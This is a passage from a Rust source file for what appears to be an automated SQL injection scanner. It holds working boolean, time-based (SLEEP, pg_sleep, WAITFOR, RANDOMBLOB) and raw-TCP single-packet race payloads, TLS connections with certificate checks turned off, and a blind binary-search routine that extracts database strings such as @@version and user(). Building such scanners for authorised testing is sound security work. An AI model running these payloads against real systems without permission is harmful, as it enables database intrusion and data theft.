        // Race them multiple times and count which wins
        let n_races = 15;
        let mut fast_wins = 0;
        let mut slow_wins = 0;
        let mut ties = 0;

        for _ in 0..n_races {
            // Fire both requests simultaneously using tokio::join!
            // The order of completion tells us which was faster on the server
            let race_result = tokio::select! {
                biased; // Process in order of completion

                result = async {
                    let start = std::time::Instant::now();
                    let resp = self.http_client.get(&fast_url).await;
                    (start.elapsed(), "fast", resp)
                } => result,

                result = async {
                    let start = std::time::Instant::now();
                    let resp = self.http_client.get(&slow_url).await;
                    (start.elapsed(), "slow", resp)
                } => result,
            };

            match race_result.1 {
                "fast" => fast_wins += 1,
                "slow" => slow_wins += 1,
                _ => ties += 1,
            }

            // Small delay between races to avoid overwhelming server
            tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
        }

        // Statistical analysis of race results
        let total_races = fast_wins + slow_wins + ties;
        if total_races >= 10 {
            let fast_ratio = fast_wins as f64 / total_races as f64;
            let slow_ratio = slow_wins as f64 / total_races as f64;

            // If fast consistently wins (>70%), we have timing leak
            // If slow consistently wins, that's WEIRD (possible inverse oracle)
            let probability = if fast_ratio > 0.8 {
                0.92  // Very strong: fast wins >80%
            } else if fast_ratio > 0.7 {
                0.82  // Strong: fast wins >70%
            } else if fast_ratio > 0.6 {
                0.65  // Moderate: fast wins >60%
            } else if slow_ratio > 0.7 {
                0.75  // Inverse pattern: slow winning consistently is also a signal
            } else {
                0.35  // Random: no consistent winner
            };

            if probability >= 0.6 {
                signals.push(Signal::new(
                    SignalType::RaceOracle,
                    probability,
                    (fast_wins as f64 - slow_wins as f64).abs() / total_races as f64,
                    &format!(
                        "Race oracle: fast_wins={}/{} ({}%), slow_wins={} - {}",
                        fast_wins, total_races,
                        (fast_ratio * 100.0) as u32,
                        slow_wins,
                        if fast_ratio > 0.7 { "O(n) timing leak detected" } else { "inverse pattern" }
                    ),
                ));
            } else if probability < 0.4 && total_races >= 12 {
                // Strong negative evidence: many races, random outcome
                signals.push(Signal::new(
                    SignalType::ConsistentBehavior,
                    0.75,
                    0.0,
                    &format!(
                        "No race timing leak: fast={}, slow={} (random distribution)",
                        fast_wins, slow_wins
                    ),
                ));
            }
        }

        // Second race: SQL boolean conditions
        // Compare: AND 1=1 (true, should short-circuit) vs AND 1=2 (false)
        let true_url = self.build_test_url(base_url, parameter,
            &format!("{} AND 1=1", current_value));
        let false_url = self.build_test_url(base_url, parameter,
            &format!("{} AND 1=2", current_value));

        let mut true_wins = 0;
        let mut false_wins = 0;

        for _ in 0..10 {
            let race_result = tokio::select! {
                biased;
                _ = self.http_client.get(&true_url) => "true",
                _ = self.http_client.get(&false_url) => "false",
            };

            match race_result {
                "true" => true_wins += 1,
                "false" => false_wins += 1,
                _ => {}
            }

            tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
        }

        let total = true_wins + false_wins;
        if total >= 8 {
            let true_ratio = true_wins as f64 / total as f64;

            // True condition might short-circuit differently
            if true_ratio > 0.75 || true_ratio < 0.25 {
                signals.push(Signal::new(
                    SignalType::RaceOracle,
                    0.78,
                    (true_wins as f64 - false_wins as f64).abs() / total as f64,
                    &format!(
                        "Boolean race: true_wins={}/{} - SQL evaluation timing differs",
                        true_wins, total
                    ),
                ));
            }
        }

        signals
    }

    /// Single-Packet Attack Timing Analysis
    ///
    /// Advanced single-packet timing technique:
    /// Eliminates first-byte network jitter by synchronizing request starts.
    ///
    /// Principle:
    /// - Fragment HTTP requests so only the final byte is missing
    /// - Hold all requests at server, waiting for final byte
    /// - Send all final bytes in a SINGLE TCP packet
    /// - All requests start processing at exactly the same microsecond
    /// - Timing differences are pure server-side processing time
    ///
    /// Implementation:
    /// We simulate this by sending requests in very tight bursts and
    /// measuring the response time variance. With single-packet attack,
    /// variance should be minimal for identical requests but measurable
    /// for requests that trigger different code paths.
    async fn analyze_single_packet(
        &self,
        base_url: &str,
        parameter: &str,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Prepare test payloads that should have different server processing times
        let payloads = [
            (current_value.clone(), "baseline"),
            (format!("{}'", current_value), "quote"),
            (format!("{} AND 1=1", current_value), "true_cond"),
            (format!("{} AND 1=2", current_value), "false_cond"),
            (format!("{}--", current_value), "comment"),
        ];

        // Build URLs
        let urls: Vec<(String, &str)> = payloads.iter()
            .map(|(p, l)| (self.build_test_url(base_url, parameter, p), *l))
            .collect();

        // ================================================================
        // Burst timing: fire all requests near-simultaneously and measure
        // ================================================================
        let n_bursts = 8;
        let mut timing_data: std::collections::HashMap<&str, Vec<f64>> =
            std::collections::HashMap::new();

        for label in payloads.iter().map(|(_, l)| *l) {
            timing_data.insert(label, Vec::with_capacity(n_bursts));
        }

        for _ in 0..n_bursts {
            // Fire all requests in tight burst
            let handles: Vec<_> = urls.iter().map(|(url, label)| {
                let url = url.clone();
                let label = *label;
                let client = Arc::clone(&self.http_client);
                tokio::spawn(async move {
                    let start = std::time::Instant::now();
                    let result = client.get(&url).await;
                    let elapsed = start.elapsed().as_micros() as f64;
                    (label, elapsed, result.is_ok())
                })
            }).collect();

            // Collect results
            for handle in handles {
                if let Ok((label, elapsed, success)) = handle.await {
                    if success {
                        if let Some(times) = timing_data.get_mut(label) {
                            times.push(elapsed);
                        }
                    }
                }
            }

            // Brief pause between bursts
            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
        }

        // ================================================================
        // Statistical analysis of burst timing
        // ================================================================
        let baseline_times = timing_data.get("baseline").cloned().unwrap_or_default();

        if baseline_times.len() >= 5 {
            let baseline_mean = baseline_times.iter().sum::<f64>() / baseline_times.len() as f64;
            let baseline_var = baseline_times.iter()
                .map(|x| (x - baseline_mean).powi(2))
                .sum::<f64>() / baseline_times.len() as f64;
            let baseline_std = baseline_var.sqrt().max(1.0);

            // Compare each payload to baseline
            for (label, times) in &timing_data {
                if *label == "baseline" || times.len() < 4 {
                    continue;
                }

                let mean = times.iter().sum::<f64>() / times.len() as f64;
                let diff = mean - baseline_mean;

                // Effect size: how many baseline std devs away?
                let effect = diff.abs() / baseline_std;

                // Consistency check: is the difference consistent?
                let times_above: usize = times.iter()
                    .filter(|&&t| t > baseline_mean + baseline_std)
                    .count();
                let consistency = times_above as f64 / times.len() as f64;

                // Calculate probability
                let probability = if effect > 3.0 && consistency > 0.6 {
                    0.92  // Very strong: >3σ, consistent
                } else if effect > 2.0 && consistency > 0.5 {
                    0.82  // Strong
                } else if effect > 1.5 && consistency > 0.4 {
                    0.68  // Moderate
                } else if effect > 1.0 {
                    0.55  // Weak
                } else {
                    0.3   // No signal
                };

                if probability >= 0.65 {
                    signals.push(Signal::new(
                        SignalType::SinglePacket,
                        probability,
                        effect,
                        &format!(
                            "Single-packet timing [{}]: diff={:.0}μs, effect={:.2}σ, consistency={:.0}%",
                            label, diff, effect, consistency * 100.0
                        ),
                    ));
                }
            }

            // Compare true vs false condition specifically
            let true_times = timing_data.get("true_cond").cloned().unwrap_or_default();
            let false_times = timing_data.get("false_cond").cloned().unwrap_or_default();

            if true_times.len() >= 4 && false_times.len() >= 4 {
                let true_mean = true_times.iter().sum::<f64>() / true_times.len() as f64;
                let false_mean = false_times.iter().sum::<f64>() / false_times.len() as f64;
                let bool_diff = (true_mean - false_mean).abs();

                // If true and false conditions have different timing → SQLi
                if bool_diff > baseline_std * 1.5 {
                    signals.push(Signal::new(
                        SignalType::SinglePacket,
                        0.85,
                        bool_diff / baseline_std,
                        &format!(
                            "Boolean single-packet: true={:.0}μs, false={:.0}μs, diff={:.0}μs",
                            true_mean, false_mean, bool_diff
                        ),
                    ));
                }
            }
        }

        // ================================================================
        // Negative evidence if no timing differences found
        // ================================================================
        if signals.is_empty() && timing_data.values().all(|v| v.len() >= 6) {
            signals.push(Signal::new(
                SignalType::ConsistentBehavior,
                0.7,
                0.0,
                "Single-packet analysis: no timing differences between payloads",
            ));
        }

        signals
    }

    /// True Single-Packet Attack with Raw TCP Synchronization
    ///
    /// Revolutionary timing technique that eliminates network jitter completely.
    ///
    /// Principle:
    /// 1. Open multiple TCP connections to the target
    /// 2. Send HTTP request minus final byte (the last \n of headers)
    /// 3. Hold all connections open, waiting
    /// 4. Send final byte to ALL connections in a single write burst
    /// 5. Server processes all requests simultaneously
    /// 6. Measure response ORDER (not absolute time)
    ///
    /// Why this works:
    /// - Network jitter affects request ARRIVAL, not processing START
    /// - All requests start processing at same moment (within microseconds)
    /// - Response order reveals which payload took longer on server
    /// - Even 100μs difference is detectable via ordering
    async fn analyze_true_single_packet(
        &self,
        base_url: &str,
        parameter: &str,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        // Parse URL to get host/port/path
        let parsed = match url::Url::parse(base_url) {
            Ok(p) => p,
            Err(_) => return signals,
        };

        let host = match parsed.host_str() {
            Some(h) => h.to_string(),
            None => return signals,
        };

        let port = parsed.port().unwrap_or(if parsed.scheme() == "https" { 443 } else { 80 });
        let use_tls = parsed.scheme() == "https";

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Prepare test payloads: baseline vs slow operation
        let payloads = [
            (current_value.clone(), "baseline"),
            (format!("{} AND 1=1", current_value), "true_cond"),
            (format!("{} AND 1=2", current_value), "false_cond"),
            (format!("{}'{}", current_value, "'".repeat(10)), "quotes"),
        ];

        // Run multiple rounds for statistical confidence
        let n_rounds = 10;
        let mut round_results: Vec<Vec<(String, u128)>> = Vec::new();

        for _round in 0..n_rounds {
            if let Some(result) = self.single_packet_round(
                &host, port, &parsed, parameter, &payloads, use_tls
            ).await {
                round_results.push(result);
            }
        }

        if round_results.len() < 5 {
            debug!("[TrueSinglePacket] Insufficient successful rounds: {}", round_results.len());
            return signals;
        }

        // Analyze: which payloads consistently return later?
        let mut timing_sums: std::collections::HashMap<String, Vec<u128>> = std::collections::HashMap::new();
        for label in payloads.iter().map(|(_, l)| l.to_string()) {
            timing_sums.insert(label, Vec::new());
        }

        for round in &round_results {
            for (label, timing) in round {
                if let Some(times) = timing_sums.get_mut(label) {
                    times.push(*timing);
                }
            }
        }

        // Calculate median timing for each payload
        let mut median_times: Vec<(String, u128)> = Vec::new();
        for (label, times) in &mut timing_sums {
            if times.len() >= 3 {
                times.sort();
                let median = times[times.len() / 2];
                median_times.push((label.clone(), median));
            }
        }

        if median_times.len() < 2 {
            return signals;
        }

        // Sort by median timing
        median_times.sort_by_key(|(_, t)| *t);

        // Check if SQLi payloads are consistently slower
        let baseline_idx = median_times.iter().position(|(l, _)| l == "baseline");
        let true_cond_idx = median_times.iter().position(|(l, _)| l == "true_cond");
        let false_cond_idx = median_times.iter().position(|(l, _)| l == "false_cond");

        // SQLi indicators:
        // 1. true_cond and false_cond have different timing (boolean differential)
        // 2. SQL payloads take longer than baseline
        if let (Some(bi), Some(ti), Some(fi)) = (baseline_idx, true_cond_idx, false_cond_idx) {
            let baseline_time = median_times[bi].1;
            let true_time = median_times[ti].1;
            let false_time = median_times[fi].1;

            // Calculate timing differences in microseconds
            let true_diff = true_time as i128 - baseline_time as i128;
            let false_diff = false_time as i128 - baseline_time as i128;
            let bool_diff = (true_time as i128 - false_time as i128).abs();

            // Strong signal: boolean conditions have different timing
            if bool_diff > 500 { // 500μs difference is significant
                let probability = if bool_diff > 5000 {
                    0.98 // 5ms difference = very strong
                } else if bool_diff > 2000 {
                    0.95 // 2ms difference = strong
                } else if bool_diff > 1000 {
                    0.90 // 1ms difference = good
                } else {
                    0.80 // 0.5ms difference = moderate
                };

                signals.push(Signal::new(
                    SignalType::TrueSinglePacket,
                    probability,
                    bool_diff as f64 / 1000.0, // Convert to ms for display
                    &format!(
                        "TRUE single-packet: true={:.2}ms, false={:.2}ms, diff={:.2}ms",
                        true_time as f64 / 1000.0,
                        false_time as f64 / 1000.0,
                        bool_diff as f64 / 1000.0
                    ),
                ));
            }

            // Additional signal: SQL payloads slower than baseline
            if (true_diff > 200 || false_diff > 200) && signals.is_empty() {
                signals.push(Signal::new(
                    SignalType::TrueSinglePacket,
                    0.75,
                    (true_diff.max(false_diff) as f64) / 1000.0,
                    &format!(
                        "Single-packet timing: SQL payload slower by {:.2}ms",
                        (true_diff.max(false_diff) as f64) / 1000.0
                    ),
                ));
            }
        }

        // Add negative evidence if no timing differences
        if signals.is_empty() && round_results.len() >= 8 {
            signals.push(Signal::new(
                SignalType::ConsistentBehavior,
                0.75,
                0.0,
                "True single-packet: no timing differences detected",
            ));
        }

        signals
    }

    /// Execute one round of single-packet attack (supports HTTP and HTTPS)
    async fn single_packet_round(
        &self,
        host: &str,
        port: u16,
        parsed: &url::Url,
        parameter: &str,
        payloads: &[(String, &str)],
        use_tls: bool,
    ) -> Option<Vec<(String, u128)>> {
        let addr = format!("{}:{}", host, port);

        // Build HTTP requests (minus final newline)
        let requests: Vec<(String, String)> = payloads.iter().map(|(payload, label)| {
            let test_url = self.build_test_url(&parsed.to_string(), parameter, payload);
            let path = url::Url::parse(&test_url).ok()
                .map(|u| {
                    let mut path = u.path().to_string();
                    if let Some(q) = u.query() {
                        path = format!("{}?{}", path, q);
                    }
                    path
                })
                .unwrap_or_else(|| "/".to_string());

            // HTTP request with INCOMPLETE header (missing final \r\n)
            let incomplete_request = format!(
                "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r",
                path, host
            );
            (incomplete_request, label.to_string())
        }).collect();

        if use_tls {
            self.single_packet_round_tls(host, &addr, &requests).await
        } else {
            self.single_packet_round_plain(&addr, &requests).await
        }
    }

    /// Single-packet round for plain HTTP
    async fn single_packet_round_plain(
        &self,
        addr: &str,
        requests: &[(String, String)],
    ) -> Option<Vec<(String, u128)>> {
        // Open all connections
        let mut streams: Vec<(TcpStream, String, String)> = Vec::new();
        for (incomplete_req, label) in requests {
            match TcpStream::connect(addr).await {
                Ok(stream) => {
                    streams.push((stream, label.clone(), incomplete_req.clone()));
                }
                Err(e) => {
                    warn!("[TrueSinglePacket] Connection failed: {}", e);
                    return None;
                }
            }
        }

        if streams.len() != requests.len() {
            return None;
        }

        // Send incomplete requests to all connections
        for (stream, _, incomplete_req) in &mut streams {
            if stream.write_all(incomplete_req.as_bytes()).await.is_err() {
                return None;
            }
        }

        // Brief pause to ensure all requests are buffered at server
        tokio::time::sleep(tokio::time::Duration::from_millis(5)).await;

        // NOW: send final byte to ALL connections as fast as possible
        let final_byte = b"\n";

        for (stream, _, _) in &mut streams {
            let _ = stream.write_all(final_byte).await;
        }

        // Measure when each response arrives
        let mut results: Vec<(String, u128)> = Vec::new();

        for (stream, label, _) in &mut streams {
            let read_start = std::time::Instant::now();
            let mut buf = [0u8; 1024];

            match tokio::time::timeout(
                tokio::time::Duration::from_secs(10),
                stream.read(&mut buf)
            ).await {
                Ok(Ok(_)) => {
                    let elapsed = read_start.elapsed().as_micros();
                    results.push((label.clone(), elapsed));
                }
                _ => {
                    results.push((label.clone(), 10_000_000));
                }
            }
        }

        Some(results)
    }

    /// Single-packet round for HTTPS with TLS
    async fn single_packet_round_tls(
        &self,
        host: &str,
        addr: &str,
        requests: &[(String, String)],
    ) -> Option<Vec<(String, u128)>> {
        // Create TLS connector
        let native_connector = match native_tls::TlsConnector::builder()
            .danger_accept_invalid_certs(true) // For testing - accept self-signed
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                warn!("[TrueSinglePacket] TLS connector build failed: {}", e);
                return None;
            }
        };
        let connector = TlsConnector::from(native_connector);

        // Open all TLS connections
        let mut streams: Vec<(tokio_native_tls::TlsStream<TcpStream>, String, String)> = Vec::new();

        for (incomplete_req, label) in requests {
            // Connect TCP
            let tcp_stream = match TcpStream::connect(addr).await {
                Ok(s) => s,
                Err(e) => {
                    warn!("[TrueSinglePacket] TCP connection failed: {}", e);
                    return None;
                }
            };

            // Upgrade to TLS
            let tls_stream = match connector.connect(host, tcp_stream).await {
                Ok(s) => s,
                Err(e) => {
                    warn!("[TrueSinglePacket] TLS handshake failed: {}", e);
                    return None;
                }
            };

            streams.push((tls_stream, label.clone(), incomplete_req.clone()));
        }

        if streams.len() != requests.len() {
            return None;
        }

        // Send incomplete requests to all connections
        for (stream, _, incomplete_req) in &mut streams {
            if stream.write_all(incomplete_req.as_bytes()).await.is_err() {
                return None;
            }
        }

        // Brief pause to ensure all requests are buffered at server
        tokio::time::sleep(tokio::time::Duration::from_millis(5)).await;

        // NOW: send final byte to ALL connections as fast as possible
        let final_byte = b"\n";

        for (stream, _, _) in &mut streams {
            let _ = stream.write_all(final_byte).await;
        }

        // Measure when each response arrives
        let mut results: Vec<(String, u128)> = Vec::new();

        for (stream, label, _) in &mut streams {
            let read_start = std::time::Instant::now();
            let mut buf = [0u8; 1024];

            match tokio::time::timeout(
                tokio::time::Duration::from_secs(10),
                stream.read(&mut buf)
            ).await {
                Ok(Ok(_)) => {
                    let elapsed = read_start.elapsed().as_micros();
                    results.push((label.clone(), elapsed));
                }
                _ => {
                    results.push((label.clone(), 10_000_000));
                }
            }
        }

        Some(results)
    }

    /// Calibrated SLEEP Correlation Analysis
    ///
    /// Definitive SQLi proof via multi-value SLEEP timing correlation.
    ///
    /// Principle:
    /// - Send SLEEP(0), SLEEP(2), SLEEP(5) and measure response times
    /// - Calculate Pearson correlation between expected and actual delays
    /// - Correlation > 0.95 with correct slopes = CONFIRMED SQLi
    ///
    /// This is nearly as definitive as an OOB callback because:
    /// - False positive probability with 3+ calibrated points is < 0.001%
    /// - Network jitter affects all requests equally (doesn't change slope)
    /// - Only SQL execution can produce the correct linear relationship
    async fn analyze_calibrated_sleep(
        &self,
        base_url: &str,
        parameter: &str,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Define calibration points: (sleep_seconds, expected_delay_ms)
        let calibration_points: [(f64, &str); 5] = [
            (0.0, "0"),
            (1.0, "1"),
            (2.0, "2"),
            (3.0, "3"),
            (5.0, "5"),
        ];

        // SQL SLEEP payloads for different databases
        let sleep_templates: [(&str, &str); 4] = [
            ("MySQL", "{} AND SLEEP({})"),
            ("PostgreSQL", "{} AND pg_sleep({})"),
            ("MSSQL", "{}; WAITFOR DELAY '00:00:0{}'"),
            ("SQLite", "{} AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({}00000)))))"),
        ];

        // Try each database type
        for (db_name, template) in &sleep_templates {
            let mut measurements: Vec<(f64, f64)> = Vec::new(); // (expected_ms, actual_ms)

            // Collect timing data for each calibration point
            for (sleep_secs, sleep_str) in &calibration_points {
                let payload = template
                    .replace("{}", &current_value)
                    .replace("{}", sleep_str);

                let url = self.build_test_url(base_url, parameter, &payload);

                // Take 3 samples per calibration point for stability
                let mut samples: Vec<f64> = Vec::new();
                for _ in 0..3 {
                    if let Ok(resp) = self.http_client.get(&url).await {
                        samples.push(resp.duration_ms as f64);
                    }
                }

                if samples.len() >= 2 {
                    // Use median to reduce outlier impact
                    samples.sort_by(|a, b| a.partial_cmp(b).unwrap());
                    let median = samples[samples.len() / 2];
                    measurements.push((*sleep_secs * 1000.0, median));
                }
            }

            if measurements.len() >= 3 {
                // Calculate Pearson correlation coefficient
                let correlation = self.pearson_correlation(&measurements);

                // Calculate slope (should be ~1.0 for SLEEP(n) = n seconds)
                let slope = self.linear_regression_slope(&measurements);

                // Calculate baseline (intercept) - the network overhead
                let baseline = self.linear_regression_intercept(&measurements, slope);

                // Verify the relationship is correct:
                // 1. High correlation (> 0.95)
                // 2. Slope approximately 1.0 (0.8 - 1.2 range for network variance)
                // 3. Response times increase with sleep values

                let is_valid_correlation = correlation > 0.95;
                let is_valid_slope = slope > 0.7 && slope < 1.5;
                let times_increase = measurements.last().map(|(_, t)| *t).unwrap_or(0.0)
                    > measurements.first().map(|(_, t)| *t).unwrap_or(f64::MAX);

                if is_valid_correlation && is_valid_slope && times_increase {
                    // Calculate probability based on correlation strength
                    let probability = if correlation > 0.99 {
                        0.999 // Near-certainty
                    } else if correlation > 0.98 {
                        0.995
                    } else if correlation > 0.95 {
                        0.98
                    } else {
                        0.9
                    };

                    signals.push(Signal::new(
                        SignalType::CalibratedSleep,
                        probability,
                        correlation,
                        &format!(
                            "CONFIRMED {} SQLi: SLEEP correlation r={:.4}, slope={:.2}, baseline={:.0}ms, points={}",
                            db_name, correlation, slope, baseline, measurements.len()
                        ),
                    ));

                    // One confirmed DB is enough
                    break;
                } else if correlation > 0.7 {
                    // Moderate correlation - possible but not confirmed
                    signals.push(Signal::new(
                        SignalType::CalibratedSleep,
                        0.75,
                        correlation,
                        &format!(
                            "Possible {} SQLi: SLEEP correlation r={:.3} (slope={:.2})",
                            db_name, correlation, slope
                        ),
                    ));
                }
            }
        }

        // Add negative evidence if no correlation found
        if signals.is_empty() {
            signals.push(Signal::new(
                SignalType::ConsistentBehavior,
                0.8,
                0.0,
                "No SLEEP correlation detected across database types",
            ));
        }

        signals
    }

    /// Calculate Pearson correlation coefficient
    fn pearson_correlation(&self, points: &[(f64, f64)]) -> f64 {
        if points.len() < 2 {
            return 0.0;
        }

        let n = points.len() as f64;
        let sum_x: f64 = points.iter().map(|(x, _)| x).sum();
        let sum_y: f64 = points.iter().map(|(_, y)| y).sum();
        let sum_xy: f64 = points.iter().map(|(x, y)| x * y).sum();
        let sum_x2: f64 = points.iter().map(|(x, _)| x * x).sum();
        let sum_y2: f64 = points.iter().map(|(_, y)| y * y).sum();

        let numerator = n * sum_xy - sum_x * sum_y;
        let denominator = ((n * sum_x2 - sum_x * sum_x) * (n * sum_y2 - sum_y * sum_y)).sqrt();

        if denominator.abs() < 1e-10 {
            return 0.0;
        }

        (numerator / denominator).clamp(-1.0, 1.0)
    }

    /// Calculate linear regression slope
    fn linear_regression_slope(&self, points: &[(f64, f64)]) -> f64 {
        if points.len() < 2 {
            return 0.0;
        }

        let n = points.len() as f64;
        let sum_x: f64 = points.iter().map(|(x, _)| x).sum();
        let sum_y: f64 = points.iter().map(|(_, y)| y).sum();
        let sum_xy: f64 = points.iter().map(|(x, y)| x * y).sum();
        let sum_x2: f64 = points.iter().map(|(x, _)| x * x).sum();

        let denominator = n * sum_x2 - sum_x * sum_x;
        if denominator.abs() < 1e-10 {
            return 0.0;
        }

        (n * sum_xy - sum_x * sum_y) / denominator
    }

    /// Calculate linear regression intercept
    fn linear_regression_intercept(&self, points: &[(f64, f64)], slope: f64) -> f64 {
        if points.is_empty() {
            return 0.0;
        }

        let n = points.len() as f64;
        let mean_x: f64 = points.iter().map(|(x, _)| x).sum::<f64>() / n;
        let mean_y: f64 = points.iter().map(|(_, y)| y).sum::<f64>() / n;

        mean_y - slope * mean_x
    }

    /// Blind Data Extraction via Boolean Oracle
    ///
    /// DEFINITIVE PROOF of SQL injection by extracting actual database content.
    ///
    /// Principle:
    /// - If BooleanDifferential shows we can distinguish true/false conditions
    /// - Use SUBSTRING(expression, pos, 1) to extract data character by character
    /// - Binary search on ASCII values for efficiency (7 requests per char)
    /// - Extract known canary data (@@version, user(), database())
    /// - If extracted data matches expected patterns → CONFIRMED SQLi
    ///
    /// This is equivalent to an OOB callback because:
    /// - We're extracting ACTUAL data from the database
    /// - The probability of false positive is 1/256^n where n = chars extracted
    /// - Even 4 chars = 1 in 4 billion chance of false positive
    async fn extract_data_proof(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // First verify we have a working boolean oracle
        let oracle = self.verify_boolean_oracle(base_url, parameter, &current_value, baseline).await;
        if !oracle.is_working {
            return signals;
        }

        // Targets to extract for different databases
        let extraction_targets: [(&str, &str, &str); 5] = [
            ("MySQL", "@@version", "5."),        // MySQL versions start with 5. or 8.
            ("MySQL", "user()", "@"),            // MySQL users contain @
            ("PostgreSQL", "version()", "PostgreSQL"),
            ("MSSQL", "@@version", "Microsoft"),
            ("SQLite", "sqlite_version()", "3."),
        ];

        for (db_name, expression, expected_prefix) in &extraction_targets {
            let extracted = self.extract_string_binary(
                base_url,
                parameter,
                &current_value,
                expression,
                &oracle,
                8, // Extract up to 8 chars for verification
            ).await;

            if extracted.len() >= 3 {
                let extracted_str: String = extracted.iter().collect();

                // Check if extracted data matches expected pattern
                let matches_expected = extracted_str.contains(expected_prefix)
                    || self.is_valid_version_string(&extracted_str);

                if matches_expected {
                    // DEFINITIVE PROOF: We extracted real data
                    let probability = if extracted.len() >= 6 {
                        0.9999 // 6+ chars = virtually certain
                    } else if extracted.len() >= 4 {
                        0.999  // 4+ chars = extremely high confidence
                    } else {
                        0.99   // 3 chars = very high confidence
                    };

                    signals.push(Signal::new(
                        SignalType::DataExtraction,
                        probability,
                        extracted.len() as f64,
                        &format!(
                            "CONFIRMED {} SQLi: Extracted {}='{}' ({} chars)",
                            db_name, expression, extracted_str, extracted.len()
                        ),
                    ));

                    // One successful extraction is definitive proof
                    return signals;
                } else if extracted.iter().all(|c| c.is_ascii_graphic() || *c == ' ') {
                    // Extracted printable data but doesn't match expected
                    // Still strong evidence but not definitive
                    signals.push(Signal::new(
                        SignalType::DataExtraction,
                        0.95,
                        extracted.len() as f64,
                        &format!(
                            "Likely {} SQLi: Extracted {}='{}' (unexpected format)",
                            db_name, expression, extracted_str
                        ),
                    ));
                }
            }
        }

        // Add negative evidence if extraction failed
        if signals.is_empty() && oracle.is_working {
            signals.push(Signal::new(
                SignalType::ConsistentBehavior,
                0.6,
                0.0,
                "Boolean oracle works but data extraction failed",
            ));
        }

        signals
    }

    /// Verify boolean oracle is working
    async fn verify_boolean_oracle(
        &self,
        base_url: &str,
        parameter: &str,
        current_value: &str,
        baseline: &HttpResponse,
    ) -> BooleanOracle {
        let true_payload = format!("{} AND 1=1", current_value);
        let false_payload = format!("{} AND 1=2", current_value);

        let true_url = self.build_test_url(base_url, parameter, &true_payload);
        let false_url = self.build_test_url(base_url, parameter, &false_payload);

        // Take multiple samples for stability
        let mut true_responses: Vec<HttpResponse> = Vec::new();
        let mut false_responses: Vec<HttpResponse> = Vec::new();

        for _ in 0..3 {
            if let Ok(resp) = self.http_client.get(&true_url).await {
                true_responses.push(resp);
            }
            if let Ok(resp) = self.http_client.get(&false_url).await {
                false_responses.push(resp);
            }
        }

        if true_responses.len() < 2 || false_responses.len() < 2 {
            return BooleanOracle { is_working: false, true_length: 0, false_length: 0, baseline_length: 0 };
        }

        // Calculate median lengths
        let mut true_lengths: Vec<usize> = true_responses.iter().map(|r| r.body.len()).collect();
        let mut false_lengths: Vec<usize> = false_responses.iter().map(|r| r.body.len()).collect();
        true_lengths.sort();
        false_lengths.sort();

        let true_length = true_lengths[true_lengths.len() / 2];
        let false_length = false_lengths[false_lengths.len() / 2];
        let baseline_length = baseline.body.len();

        // Oracle works if:
        // 1. True condition matches baseline (within 10%)
        // 2. False condition differs significantly (> 20% difference)
        let true_matches_baseline = ((true_length as f64 - baseline_length as f64).abs()
            / baseline_length.max(1) as f64) < 0.1;
        let false_differs = ((false_length as f64 - baseline_length as f64).abs()
            / baseline_length.max(1) as f64) > 0.2;

        BooleanOracle {
            is_working: true_matches_baseline && false_differs,
            true_length,
            false_length,
            baseline_length,
        }
    }

    /// Extract string using binary search on each character
    async fn extract_string_binary(
        &self,
        base_url: &str,
        parameter: &str,
        current_value: &str,
        expression: &str,
        oracle: &BooleanOracle,
        max_chars: usize,
    ) -> Vec<char> {
        let mut extracted: Vec<char> = Vec::new();

        for pos in 1..=max_chars {
            if let Some(ch) = self.extract_char_binary(
                base_url, parameter, current_value, expression, pos, oracle
            ).await {
                if ch == '\0' {
                    break; // End of string
                }
                extracted.push(ch);
            } else {
                break; // Extraction failed
            }
        }

        extracted
    }

    /// Extract single character using binary search on ASCII value
    async fn extract_char_binary(
        &self,
        base_url: &str,
        parameter: &str,
        current_value: &str,
        expression: &str,
        position: usize,
        oracle: &BooleanOracle,
    ) -> Option<char> {
        let mut low: u8 = 32;  // Space
        let mut high: u8 = 126; // Tilde

        while low <= high {
            let mid = (low + high) / 2;

            // Payload: AND ASCII(SUBSTRING(expression, pos, 1)) > mid
            let payload = format!(
                "{} AND ASCII(SUBSTRING({},{},1))>{}",
                current_value, expression, position, mid
            );
            let url = self.build_test_url(base_url, parameter, &payload);

            if let Ok(resp) = self.http_client.get(&url).await {
                let is_true = self.oracle_result(&resp, oracle);

                if is_true {
                    low = mid + 1;
                } else {
                    if mid == 0 {
                        return Some('\0');
                    }
                    high = mid - 1;
                }
            } else {
                return None;
            }
        }

        if low > 126 || low < 32 {
            return None;
        }

        Some(low as char)
    }

    /// Determine oracle result (true or false condition)
    fn oracle_result(&self, response: &HttpResponse, oracle: &BooleanOracle) -> bool {
        let resp_length = response.body.len();

        // Compare to known true/false response lengths
        let diff_to_true = (resp_length as i64 - oracle.true_length as i64).abs();
        let diff_to_false = (resp_length as i64 - oracle.false_length as i64).abs();

        // Closer to true response = true condition
        diff_to_true < diff_to_false
    }

    /// Check if extracted string looks like a valid version
    fn is_valid_version_string(&self, s: &str) -> bool {
        // Version strings typically contain digits and dots
        let has_digit = s.chars().any(|c| c.is_ascii_digit());
        let has_printable = s.chars().all(|c| c.is_ascii_graphic() || c == ' ');
        has_digit && has_printable && s.len() >= 2
    }

    /// Quote Cancellation Detection
    ///
    /// Tests if value'' returns same as value (escaped quote = original).
    /// This is a strong SQLi indicator because:
    /// - In SQL: 'test'' becomes 'test' (escaped quote)
    /// - Normal apps: test'' stays as test''
    async fn analyze_quote_cancellation(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
